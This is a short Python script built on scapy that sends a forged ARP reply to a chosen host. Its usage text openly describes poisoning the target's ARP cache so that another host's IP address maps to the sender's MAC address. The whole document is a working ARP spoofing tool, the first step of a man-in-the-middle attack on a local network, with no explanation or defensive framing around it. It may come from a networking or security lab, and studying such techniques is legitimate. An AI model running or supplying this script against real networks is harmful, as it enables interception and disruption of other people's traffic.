#!/usr/bin/env python3

import sys
from scapy.all import *

def main():
    if len(sys.argv) != 4:
        usage()
        sys.exit(2)
    psrc_ = sys.argv[1]
    pdst_ = sys.argv[2]
    hwdst_ = sys.argv[3]
    E = Ether(dst = hwdst_)
    A = ARP(psrc = psrc_, pdst = pdst_, op = 2, hwdst = hwdst_)
    sendp(E/A, verbose=0)
    print(f'sent ARP reply to {pdst_}')
    
def usage():
    print("Usage: ./arp-reply.py <src-ip> <dst-ip> <dst-mac>\
    \n\tsrc-ip: IP address of the host you want to map to your MAC address\
    \n\tdst-ip: Ip address of the host whose ARP cache you want to poison\
    \n\tdst-mac: The MAC address of the host whose ARP cache you want to poison\n")
    
    
if __name__ == '__main__':
    main()
